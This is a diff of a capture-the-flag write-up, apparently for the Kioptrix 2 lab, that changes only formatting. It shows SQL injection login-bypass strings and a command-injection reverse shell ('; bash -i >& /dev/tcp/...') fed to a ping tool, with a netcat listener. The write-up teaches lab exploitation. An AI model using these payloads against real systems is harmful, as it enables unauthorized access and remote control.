@@ -33,9 +33,12 @@ My two favorite cheat sheets for SQL Authentication bypass are:
 If you've never tried this before, take a minute to look over the two links above and try a few methods yourself.
 
 There are several methods that will work here:
-> admin' 1=1 -- \
-> admin' 1=1 #
-> admin' #
+`admin' 1=1 -- \`
+
+`admin' 1=1 #`
+
+`admin' #`
+
 
 ### Step 3: Get in the Bear's House
 
@@ -54,11 +57,11 @@ Let's see if we can get a bash reverse shell.
 
 For a great reverse shell cheat sheet check out the [Pentest Monkey Blog](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 Start by setting up a netcat listener on your attacker machine. 
-`**nc -nvlp 4444**`
+` nc -nvlp 4444`
 
 And then pass the reverse shell script into the ping tool.
 
-`**; bash -i >& /dev/tcp/192.168.65.133/4444 0>&1**`
+`; bash -i >& /dev/tcp/192.168.65.133/4444 0>&1`
 
 ![](/images/kioptrix2/kioptrix2-6.png)
 Boom! We've got our low priv shell.
